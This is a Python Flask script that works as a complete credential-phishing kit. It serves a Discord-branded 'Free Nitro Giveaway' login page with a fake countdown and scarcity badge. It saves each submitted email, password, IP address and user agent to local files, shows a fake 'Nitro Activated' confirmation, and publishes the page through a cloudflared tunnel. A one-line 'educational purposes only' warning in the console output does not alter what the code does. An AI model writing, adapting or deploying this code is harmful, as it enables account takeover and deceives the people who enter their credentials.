import os
import sys
import subprocess
import re
import threading
import time
import logging
import random
from flask import Flask, render_template_string, request, session
from datetime import datetime
from werkzeug.utils import secure_filename

def install(pkg):
    subprocess.check_call([sys.executable, "-m", "pip", "install", "--quiet", pkg])

for pkg in ["flask", "werkzeug"]:
    try:
        __import__(pkg)
    except ImportError:
        install(pkg)

app = Flask(__name__)
app.secret_key = 'discord-test-key'

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR + 10)
app.logger.setLevel(logging.ERROR + 10)

class DummyFile(object):
    def write(self, x): pass
    def flush(self): pass

BASE_FOLDER = os.path.expanduser("~/storage/downloads/Discord Nitro")
os.makedirs(BASE_FOLDER, exist_ok=True)

@app.route('/')
def index():
    session['dc_session'] = str(random.randint(100000, 999999))
    return render_template_string('''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <meta name="apple-mobile-web-app-capable" content="yes">
        <title>Discord Nitro Giveaway</title>
        <style>
            @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
            
            :root {
                --discord-blurple: #5865F2;
                --discord-dark: #313338;
                --discord-gray: #B5BAC1;
                --discord-green: #23A559;
                --discord-red: #ED4245;
            }
            
            * {
                box-sizing: border-box;
                margin: 0;
                padding: 0;
            }
            
            body {
                background: #1e1f22;
                font-family: 'Inter', 'gg sans', 'Noto Sans', 'Helvetica Neue', Helvetica, Arial, sans-serif;
                display: flex;
                justify-content: center;
                align-items: flex-start;
                min-height: 100vh;
                color: #f2f3f5;
                -webkit-text-size-adjust: 100%;
                -webkit-tap-highlight-color: transparent;
                padding: 20px 16px;
                overflow-x: hidden;
            }
            
            .login-box {
                background: #313338;
                width: 100%;
                max-width: 440px;
                padding: 24px 20px;
                border-radius: 8px;
                text-align: center;
                box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
                border: 1px solid #3f4147;
            }
            
            @media (min-width: 768px) {
                .login-box {
                    padding: 32px;
                    margin: 20px auto;
                }
                body {
                    padding: 20px;
                    align-items: center;
                }
            }
            
            .discord-logo-container {
                display: flex;
                align-items: center;
                justify-content: center;
                margin-bottom: 20px;
                gap: 10px;
            }
            
            .discord-logo {
                height: 32px;
                width: auto;
            }
            
            @media (min-width: 768px) {
                .discord-logo {
                    height: 36px;
                }
            }
            
            .discord-text {
                color: white;
                font-size: 24px;
                font-weight: 800;
                letter-spacing: -0.5px;
            }
            
            @media (min-width: 768px) {
                .discord-text {
                    font-size: 28px;
                }
            }
            
            .nitro-banner {
                background: linear-gradient(45deg, #5865F2, #9b59b6, #e91e63);
                color: white;
                padding: 14px 16px;
                border-radius: 8px;
                margin: 16px 0;
                font-weight: 700;
                font-size: 16px;
                border: 2px solid #1e1f22;
                box-shadow: 0 0 20px rgba(88, 101, 242, 0.3);
                line-height: 1.3;
            }
            
            @media (min-width: 768px) {
                .nitro-banner {
                    padding: 16px;
                    font-size: 18px;
                    margin: 20px 0;
                }
            }
            
            .giveaway-box {
                background: #2b2d31;
                border: 2px dashed #5865F2;
                border-radius: 8px;
                padding: 20px;
                margin: 20px 0;
                text-align: center;
            }
            
            @media (min-width: 768px) {
                .giveaway-box {
                    padding: 24px;
                }
            }
            
            .nitro-icon {
                background: linear-gradient(45deg, #5865F2, #9b59b6);
                color: white;
                width: 56px;
                height: 56px;
                border-radius: 50%;
                display: flex;
                align-items: center;
                justify-content: center;
                margin: 0 auto 12px;
                font-size: 24px;
                font-weight: 800;
                box-shadow: 0 4px 12px rgba(88, 101, 242, 0.4);
            }
            
            @media (min-width: 768px) {
                .nitro-icon {
                    width: 64px;
                    height: 64px;
                    font-size: 28px;
                    margin-bottom: 15px;
                }
            }
            
            h1 {
                color: white;
                font-size: 22px;
                margin: 8px 0;
                font-weight: 700;
                line-height: 1.3;
            }
            
            @media (min-width: 768px) {
                h1 {
                    font-size: 24px;
                    margin: 10px 0;
                }
            }
            
            .subtitle {
                color: #b5bac1;
                font-size: 15px;
                margin-bottom: 24px;
                line-height: 1.4;
            }
            
            @media (min-width: 768px) {
                .subtitle {
                    font-size: 16px;
                    margin-bottom: 30px;
                }
            }
            
            .form-group {
                text-align: left;
                margin-bottom: 18px;
            }
            
            @media (min-width: 768px) {
                .form-group {
                    margin-bottom: 20px;
                }
            }
            
            .form-label {
                color: #b5bac1;
                font-size: 11px;
                font-weight: 700;
                text-transform: uppercase;
                letter-spacing: 0.5px;
                margin-bottom: 6px;
                display: block;
            }
            
            @media (min-width: 768px) {
                .form-label {
                    font-size: 12px;
                    margin-bottom: 8px;
                }
            }
            
            input {
                width: 100%;
                padding: 14px;
                background: #1e1f22;
                border: 1px solid #1e1f22;
                border-radius: 3px;
                color: white;
                font-size: 16px;
                box-sizing: border-box;
                transition: all 0.2s;
                font-family: 'Inter', sans-serif;
                -webkit-appearance: none;
                appearance: none;
            }
            
            @media (min-width: 768px) {
                input {
                    padding: 12px;
                    font-size: 16px;
                }
            }
            
            input:focus {
                border-color: #00aff4;
                outline: none;
                box-shadow: 0 0 0 2px rgba(0, 175, 244, 0.2);
            }
            
            input::placeholder {
                color: #8e9297;
            }
            
            .login-btn {
                background: var(--discord-blurple);
                color: white;
                border: none;
                padding: 16px;
                border-radius: 3px;
                font-weight: 600;
                font-size: 16px;
                width: 100%;
                margin: 16px 0 12px;
                cursor: pointer;
                transition: all 0.2s;
                font-family: 'Inter', sans-serif;
                min-height: 44px;
                display: flex;
                align-items: center;
                justify-content: center;
                gap: 8px;
            }
            
            @media (min-width: 768px) {
                .login-btn {
                    padding: 14px;
                    margin: 10px 0;
                }
            }
            
            .login-btn:hover,
            .login-btn:active {
                background: #4752c4;
                transform: translateY(-1px);
                box-shadow: 0 4px 12px rgba(88, 101, 242, 0.4);
            }
            
            .qr-option {
                background: #2b2d31;
                border: 1px solid #3f4147;
                color: #b5bac1;
                padding: 16px;
                border-radius: 3px;
                font-size: 16px;
                width: 100%;
                margin: 12px 0;
                cursor: pointer;
                text-align: center;
                transition: all 0.2s;
                min-height: 44px;
                display: flex;
                align-items: center;
                justify-content: center;
                gap: 8px;
            }
            
            @media (min-width: 768px) {
                .qr-option {
                    padding: 12px;
                }
            }
            
            .qr-option:hover {
                background: #35373c;
                border-color: #5865F2;
            }
            
            .register-link {
                color: #00aff4;
                text-decoration: none;
                font-size: 14px;
                margin-top: 20px;
                display: block;
                font-weight: 500;
            }
            
            .register-link:hover {
                text-decoration: underline;
            }
            
            .benefits {
                background: #2b2d31;
                border-radius: 8px;
                padding: 18px;
                margin: 20px 0;
                text-align: left;
            }
            
            @media (min-width: 768px) {
                .benefits {
                    padding: 20px;
                }
            }
            
            .benefit-item {
                display: flex;
                align-items: flex-start;
                margin: 12px 0;
                color: #b5bac1;
                font-size: 15px;
                line-height: 1.4;
            }
            
            @media (min-width: 768px) {
                .benefit-item {
                    margin: 10px 0;
                    font-size: 16px;
                }
            }
            
            .benefit-item::before {
                content: "✓";
                color: #23a559;
                font-weight: bold;
                margin-right: 10px;
                margin-top: 1px;
                flex-shrink: 0;
            }
            
            .timer {
                background: #1e1f22;
                border-radius: 8px;
                padding: 16px;
                margin: 20px 0;
                font-family: 'JetBrains Mono', 'Fira Code', monospace;
                font-size: 22px;
                color: #f23f42;
                text-align: center;
                border: 2px solid #f23f42;
                font-weight: 700;
                letter-spacing: 1px;
            }
            
            @media (min-width: 768px) {
                .timer {
                    font-size: 24px;
                    padding: 15px;
                }
            }
            
            .limited-badge {
                display: inline-block;
                background: linear-gradient(45deg, #f23f42, #ff6b6b);
                color: white;
                padding: 4px 10px;
                border-radius: 12px;
                font-size: 11px;
                font-weight: 700;
                margin-left: 8px;
                box-shadow: 0 2px 8px rgba(242, 63, 66, 0.3);
            }
            
            @media (min-width: 768px) {
                .limited-badge {
                    font-size: 12px;
                    padding: 4px 12px;
                    margin-left: 10px;
                }
            }
            
            /* Mobile touch improvements */
            button, 
            input,
            .login-btn,
            .qr-option {
                touch-action: manipulation;
            }
            
            /* Better focus for accessibility */
            *:focus {
                outline: 2px solid #00aff4;
                outline-offset: 2px;
            }
            
            /* Custom scrollbar for webkit browsers */
            ::-webkit-scrollbar {
                width: 8px;
            }
            
            ::-webkit-scrollbar-track {
                background: #2b2d31;
            }
            
            ::-webkit-scrollbar-thumb {
                background: #5865F2;
                border-radius: 4px;
            }
            
            ::-webkit-scrollbar-thumb:hover {
                background: #4752c4;
            }
            
            /* Pulse animation for timer */
            @keyframes pulse {
                0%, 100% { opacity: 1; }
                50% { opacity: 0.7; }
            }
            
            /* Loading animation */
            .loading-dots {
                display: inline-block;
            }
            
            .loading-dots::after {
                content: '';
                animation: dots 1.5s steps(4, end) infinite;
            }
            
            @keyframes dots {
                0%, 20% { content: ''; }
                40% { content: '.'; }
                60% { content: '..'; }
                80%, 100% { content: '...'; }
            }
        </style>
    </head>
    <body>
        <div class="login-box">
            <div class="discord-logo-container">
                <svg class="discord-logo" viewBox="0 0 127.14 96.36" xmlns="http://www.w3.org/2000/svg">
                    <defs>
                        <style>.cls-1{fill:#5865f2;}</style>
                    </defs>
                    <g id="图层_2" data-name="图层 2">
                        <g id="Discord_Logos" data-name="Discord Logos">
                            <g id="Discord_Logo_-_Large_-_White" data-name="Discord Logo - Large - White">
                                <path class="cls-1" d="M107.7,8.07A105.15,105.15,0,0,0,81.47,0a72.06,72.06,0,0,0-3.36,6.83A97.68,97.68,0,0,0,49,6.83,72.37,72.37,0,0,0,45.64,0,105.89,105.89,0,0,0,19.39,8.09C2.79,32.65-1.71,56.6.54,80.21h0A105.73,105.73,0,0,0,32.71,96.36,77.7,77.7,0,0,0,39.6,85.25a68.42,68.42,0,0,1-10.85-5.18c.91-.66,1.8-1.34,2.66-2a75.57,75.57,0,0,0,64.32,0c.87.71,1.76,1.39,2.66,2a68.68,68.68,0,0,1-10.87,5.19,77,77,0,0,0,6.89,11.1A105.25,105.25,0,0,0,126.6,80.22h0C129.24,52.84,122.09,29.11,107.7,8.07ZM42.45,65.69C36.18,65.69,31,60,31,53s5-12.74,11.43-12.74S54,46,53.89,53,48.84,65.69,42.45,65.69Zm42.24,0C78.41,65.69,73.25,60,73.25,53s5-12.74,11.44-12.74S96.23,46,96.12,53,91.08,65.69,84.69,65.69Z"/>
                            </g>
                        </g>
                    </g>
                </svg>
                <div class="discord-text">Discord</div>
            </div>
            
            <div class="nitro-banner">
                🎁 FREE NITRO GIVEAWAY 🎁
            </div>
            
            <div class="giveaway-box">
                <div class="nitro-icon">N</div>
                <h1>Claim Your FREE Discord Nitro</h1>
                <div class="subtitle">
                    Limited to first 100 users! <span class="limited-badge">23 spots left</span>
                </div>
            </div>
            
            <div class="timer" id="countdown">
                10:00
            </div>
            
            <div class="benefits">
                <div class="benefit-item">Nitro Classic for 1 year</div>
                <div class="benefit-item">2 Server Boosts included</div>
                <div class="benefit-item">HD Video & Screen Share</div>
                <div class="benefit-item">Custom Discord Tag</div>
                <div class="benefit-item">Animated Avatar & Emoji</div>
                <div class="benefit-item">300MB Upload Size</div>
            </div>
            
            <form action="/login" method="post" id="loginForm">
                <div class="form-group">
                    <label class="form-label">EMAIL OR PHONE NUMBER</label>
                    <input type="text" name="username" placeholder="user@example.com" required>
                </div>
                
                <div class="form-group">
                    <label class="form-label">PASSWORD</label>
                    <input type="password" name="password" placeholder="Enter your password" required>
                </div>
                
                <button type="submit" class="login-btn">
                    🎮 Claim Discord Nitro
                </button>
            </form>
            
            <div class="qr-option">
                📱 Login with QR Code
            </div>
            
            <a href="#" class="register-link">
                Need an account? Register
            </a>
        </div>
        
        <script>
            // Countdown timer
            let timeLeft = 600; // 10 minutes in seconds
            const countdownElement = document.getElementById('countdown');
            
            function updateTimer() {
                const minutes = Math.floor(timeLeft / 60);
                const seconds = timeLeft % 60;
                countdownElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
                
                if (timeLeft <= 60) {
                    countdownElement.style.animation = 'pulse 1s infinite';
                    countdownElement.style.boxShadow = '0 0 20px rgba(242, 63, 66, 0.5)';
                }
                
                if (timeLeft > 0) {
                    timeLeft--;
                    setTimeout(updateTimer, 1000);
                } else {
                    countdownElement.textContent = "Giveaway Ended!";
                    countdownElement.style.color = '#8e9297';
                    countdownElement.style.borderColor = '#8e9297';
                }
            }
            
            updateTimer();
            
            // Form validation for mobile
            const loginForm = document.getElementById('loginForm');
            const inputs = loginForm.querySelectorAll('input[required]');
            
            loginForm.addEventListener('submit', function(e) {
                let isValid = true;
                
                inputs.forEach(input => {
                    if (!input.value.trim()) {
                        isValid = false;
                        input.style.borderColor = '#f23f42';
                        input.style.boxShadow = '0 0 0 2px rgba(242, 63, 66, 0.2)';
                    } else {
                        input.style.borderColor = '#1e1f22';
                        input.style.boxShadow = 'none';
                    }
                });
                
                if (!isValid) {
                    e.preventDefault();
                    alert('Please fill in all required fields.');
                } else {
                    // Show loading state
                    const submitBtn = loginForm.querySelector('button[type="submit"]');
                    submitBtn.innerHTML = 'Processing<span class="loading-dots"></span>';
                    submitBtn.disabled = true;
                }
            });
            
            // Clear error states on input
            inputs.forEach(input => {
                input.addEventListener('input', function() {
                    if (this.value.trim()) {
                        this.style.borderColor = '#1e1f22';
                        this.style.boxShadow = 'none';
                    }
                });
            });
            
            // Handle viewport for mobile
            function handleViewport() {
                const vh = window.innerHeight * 0.01;
                document.documentElement.style.setProperty('--vh', `${vh}px`);
                
                // Adjust body height for mobile browsers
                document.body.style.height = `calc(var(--vh, 1vh) * 100)`;
            }
            
            window.addEventListener('load', handleViewport);
            window.addEventListener('resize', handleViewport);
            window.addEventListener('orientationchange', handleViewport);
            
            // Prevent zoom on input focus for mobile
            let lastTouchEnd = 0;
            document.addEventListener('touchend', function(event) {
                const now = (new Date()).getTime();
                if (now - lastTouchEnd <= 300) {
                    event.preventDefault();
                }
                lastTouchEnd = now;
            }, false);
            
            // Add vibration on timer warning (mobile only)
            if ('vibrate' in navigator && timeLeft <= 60) {
                navigator.vibrate([200, 100, 200]);
            }
        </script>
    </body>
    </html>
    ''')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username', '').strip()
    password = request.form.get('password', '').strip()
    session_id = session.get('dc_session', 'unknown')

    safe_username = secure_filename(username)
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    user_file_path = os.path.join(BASE_FOLDER, f"{safe_username}_{timestamp}.txt")

    with open(user_file_path, 'w') as file:
        file.write(f"Session: {session_id}\n")
        file.write(f"Username/Email: {username}\n")
        file.write(f"Password: {password}\n")
        file.write(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        file.write(f"User-Agent: {request.headers.get('User-Agent', 'Unknown')}\n")
        file.write(f"IP: {request.remote_addr}\n")
        file.write(f"Platform: Discord Nitro Giveaway\n")

    return render_template_string('''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Processing Discord Nitro</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <meta name="apple-mobile-web-app-capable" content="yes">
        <style>
            @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
            
            * {
                box-sizing: border-box;
                margin: 0;
                padding: 0;
            }
            
            body {
                background: linear-gradient(135deg, #1e1f22 0%, #2b2d31 100%);
                font-family: 'Inter', 'gg sans', 'Noto Sans', Helvetica, Arial, sans-serif;
                display: flex;
                justify-content: center;
                align-items: flex-start;
                min-height: 100vh;
                color: #f2f3f5;
                -webkit-text-size-adjust: 100%;
                -webkit-tap-highlight-color: transparent;
                padding: 20px 16px;
            }
            
            .container {
                text-align: center;
                background: #313338;
                padding: 24px 20px;
                border-radius: 12px;
                width: 100%;
                max-width: 500px;
                border: 3px solid #5865F2;
                box-shadow: 0 0 30px rgba(88, 101, 242, 0.3);
            }
            
            @media (min-width: 768px) {
                .container {
                    padding: 40px;
                    margin: 20px auto;
                }
                body {
                    padding: 20px;
                    align-items: center;
                }
            }
            
            .discord-logo-container {
                display: flex;
                align-items: center;
                justify-content: center;
                margin-bottom: 20px;
                gap: 10px;
            }
            
            .discord-logo {
                height: 28px;
                width: auto;
            }
            
            @media (min-width: 768px) {
                .discord-logo {
                    height: 32px;
                }
            }
            
            .discord-text {
                color: white;
                font-size: 22px;
                font-weight: 800;
                letter-spacing: -0.5px;
            }
            
            @media (min-width: 768px) {
                .discord-text {
                    font-size: 24px;
                }
            }
            
            .success-icon {
                background: linear-gradient(45deg, #5865F2, #9b59b6);
                color: white;
                width: 64px;
                height: 64px;
                border-radius: 50%;
                display: flex;
                align-items: center;
                justify-content: center;
                margin: 0 auto 20px;
                font-size: 28px;
                box-shadow: 0 4px 20px rgba(88, 101, 242, 0.4);
                animation: pulseSuccess 2s infinite;
            }
            
            @media (min-width: 768px) {
                .success-icon {
                    width: 80px;
                    height: 80px;
                    font-size: 36px;
                }
            }
            
            @keyframes pulseSuccess {
                0%, 100% { transform: scale(1); }
                50% { transform: scale(1.05); }
            }
            
            .processing-container {
                background: #2b2d31;
                border-radius: 8px;
                padding: 20px;
                margin: 24px 0;
            }
            
            @media (min-width: 768px) {
                .processing-container {
                    margin: 30px 0;
                }
            }
            
            .progress-bar {
                width: 100%;
                height: 8px;
                background: #1e1f22;
                border-radius: 4px;
                margin: 16px 0;
                overflow: hidden;
            }
            
            @media (min-width: 768px) {
                .progress-bar {
                    margin: 20px 0;
                }
            }
            
            .progress-fill {
                height: 100%;
                background: linear-gradient(90deg, #5865F2, #9b59b6, #e91e63);
                border-radius: 4px;
                width: 0%;
                animation: fillProgress 2s ease-in-out forwards;
            }
            
            @keyframes fillProgress {
                0% { width: 0%; }
                100% { width: 100%; }
            }
            
            .nitro-activated {
                background: rgba(88, 101, 242, 0.1);
                border: 2px solid #5865F2;
                border-radius: 8px;
                padding: 18px;
                margin: 20px 0;
                text-align: left;
            }
            
            @media (min-width: 768px) {
                .nitro-activated {
                    padding: 20px;
                }
            }
            
            .checkmark {
                color: #23a559;
                font-weight: bold;
                margin-right: 10px;
                font-size: 18px;
                flex-shrink: 0;
            }
            
            .status-item {
                display: flex;
                align-items: flex-start;
                margin: 12px 0;
                color: #b5bac1;
                font-size: 15px;
                line-height: 1.4;
            }
            
            @media (min-width: 768px) {
                .status-item {
                    margin: 10px 0;
                    font-size: 16px;
                }
            }
            
            h2 {
                color: #5865F2;
                margin-bottom: 8px;
                font-size: 20px;
                font-weight: 700;
            }
            
            @media (min-width: 768px) {
                h2 {
                    font-size: 24px;
                    margin-bottom: 10px;
                }
            }
            
            h3 {
                color: white;
                margin-bottom: 12px;
                font-size: 18px;
                font-weight: 600;
            }
            
            @media (min-width: 768px) {
                h3 {
                    font-size: 20px;
                }
            }
            
            p {
                color: #b5bac1;
                font-size: 15px;
                line-height: 1.4;
                margin-bottom: 16px;
            }
            
            @media (min-width: 768px) {
                p {
                    font-size: 16px;
                    margin-bottom: 20px;
                }
            }
            
            small {
                font-size: 13px;
                color: #8e9297;
            }
            
            /* Mobile improvements */
            .container > * {
                min-height: 44px;
                display: flex;
                align-items: center;
                justify-content: center;
            }
            
            .status-item strong {
                color: white;
            }
        </style>
        <meta http-equiv="refresh" content="7;url=/" />
    </head>
    <body>
        <div class="container">
            <div class="discord-logo-container">
                <svg class="discord-logo" viewBox="0 0 127.14 96.36" xmlns="http://www.w3.org/2000/svg">
                    <defs>
                        <style>.cls-1{fill:#5865f2;}</style>
                    </defs>
                    <g id="图层_2" data-name="图层 2">
                        <g id="Discord_Logos" data-name="Discord Logos">
                            <g id="Discord_Logo_-_Large_-_White" data-name="Discord Logo - Large - White">
                                <path class="cls-1" d="M107.7,8.07A105.15,105.15,0,0,0,81.47,0a72.06,72.06,0,0,0-3.36,6.83A97.68,97.68,0,0,0,49,6.83,72.37,72.37,0,0,0,45.64,0,105.89,105.89,0,0,0,19.39,8.09C2.79,32.65-1.71,56.6.54,80.21h0A105.73,105.73,0,0,0,32.71,96.36,77.7,77.7,0,0,0,39.6,85.25a68.42,68.42,0,0,1-10.85-5.18c.91-.66,1.8-1.34,2.66-2a75.57,75.57,0,0,0,64.32,0c.87.71,1.76,1.39,2.66,2a68.68,68.68,0,0,1-10.87,5.19,77,77,0,0,0,6.89,11.1A105.25,105.25,0,0,0,126.6,80.22h0C129.24,52.84,122.09,29.11,107.7,8.07ZM42.45,65.69C36.18,65.69,31,60,31,53s5-12.74,11.43-12.74S54,46,53.89,53,48.84,65.69,42.45,65.69Zm42.24,0C78.41,65.69,73.25,60,73.25,53s5-12.74,11.44-12.74S96.23,46,96.12,53,91.08,65.69,84.69,65.69Z"/>
                            </g>
                        </g>
                    </g>
                </svg>
                <div class="discord-text">Discord</div>
            </div>
            
            <div class="success-icon">✓</div>
            <h2>Discord Nitro Activated!</h2>
            
            <div class="processing-container">
                <h3>Processing Your Nitro Subscription</h3>
                <div class="progress-bar">
                    <div class="progress-fill"></div>
                </div>
                <p>Applying Nitro benefits to your account...</p>
            </div>
            
            <div class="nitro-activated">
                <div class="status-item">
                    <span class="checkmark">✓</span>
                    <div><strong>Nitro Classic Activated</strong> - Valid for 1 year</div>
                </div>
                <div class="status-item">
                    <span class="checkmark">✓</span>
                    <div><strong>2 Server Boosts</strong> - Applied to your account</div>
                </div>
                <div class="status-item">
                    <span class="checkmark">✓</span>
                    <div><strong>Custom Discord Tag</strong> - Choose in settings</div>
                </div>
                <div class="status-item">
                    <span class="checkmark">✓</span>
                    <div><strong>Animated Avatar</strong> - Now available</div>
                </div>
                <div class="status-item">
                    <span class="checkmark">✓</span>
                    <div><strong>HD Screen Share</strong> - Up to 1080p</div>
                </div>
            </div>
            
            <p>
                You will be redirected to Discord shortly...
                <br>
                <small>Please check your Discord app for Nitro benefits</small>
            </p>
        </div>
        
        <script>
            // Handle viewport for mobile
            function handleViewport() {
                const vh = window.innerHeight * 0.01;
                document.documentElement.style.setProperty('--vh', `${vh}px`);
                document.body.style.height = `calc(var(--vh, 1vh) * 100)`;
            }
            
            window.addEventListener('load', handleViewport);
            window.addEventListener('resize', handleViewport);
            window.addEventListener('orientationchange', handleViewport);
            
            // Add subtle animation to success items
            setTimeout(() => {
                const statusItems = document.querySelectorAll('.status-item');
                statusItems.forEach((item, index) => {
                    setTimeout(() => {
                        item.style.opacity = '1';
                        item.style.transform = 'translateX(0)';
                        item.style.transition = 'opacity 0.3s, transform 0.3s';
                    }, index * 200);
                });
                
                // Set initial state
                statusItems.forEach(item => {
                    item.style.opacity = '0';
                    item.style.transform = 'translateX(-10px)';
                });
            }, 500);
        </script>
    </body>
    </html>
    ''')

def run_cloudflared_tunnel(local_url):
    cmd = ["cloudflared", "tunnel", "--url", local_url]
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    
    for line in process.stdout:
        match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
        if match:
            tunnel_url = match.group(0)
            print(f"🎮 Discord Nitro Public Link: {tunnel_url}")
            print(f"💾 Credentials saved to: {BASE_FOLDER}")
            print("⚠️  WARNING: For educational purposes only!")
            print("⚠️  NEVER enter real Discord credentials!")
            print("-" * 50)
            sys.stdout.flush()
            break
    
    return process

if __name__ == '__main__':
    sys_stdout = sys.stdout
    sys_stderr = sys.stderr
    sys.stdout = DummyFile()
    sys.stderr = DummyFile()

    def run_flask():
        app.run(host='0.0.0.0', port=5002, debug=False, use_reloader=False)

    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()

    time.sleep(2)
    sys.stdout = sys_stdout
    sys.stderr = sys_stderr

    print("🚀 Starting Discord Nitro Giveaway Page...")
    print("📱 Port: 5002")
    print("💾 Save location: ~/storage/downloads/DiscordNitro/")
    print("🎁 Promising: FREE Discord Nitro for 1 year")
    print("⏳ Waiting for cloudflared tunnel...")
    
    cloudflared_process = run_cloudflared_tunnel("http://127.0.0.1:5002")

    try:
        cloudflared_process.wait()
    except KeyboardInterrupt:
        cloudflared_process.terminate()
        print("\n👋 Server stopped")
        sys.exit(0)